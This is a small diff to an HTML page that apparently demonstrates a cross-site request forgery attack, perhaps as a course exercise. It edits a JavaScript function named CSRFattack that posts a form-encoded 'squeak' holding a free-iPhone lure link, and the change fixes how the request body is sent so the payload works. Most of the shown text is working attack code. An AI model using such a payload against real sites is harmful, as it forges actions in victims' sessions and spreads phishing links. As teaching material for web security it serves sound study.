@@ -40,8 +40,8 @@
     <script src="js/bootstrap.min.js"></script>
     <script>
       function CSRFattack() {
-        let body = new URLSearchParams();
-        body.append(
+        let data = new URLSearchParams();
+        data.append(
           "squeak",
           'Click <a href="https://niccolo-francioni.github.io/csrf-attack/">here</a> to get the iPhone X for free!'
         );
@@ -50,7 +50,7 @@
           headers: {
             "Content-Type": "application/x-www-form-urlencoded",
           },
-          body: JSON.stringify(data),
+          body: data,
         });
       }
     </script>
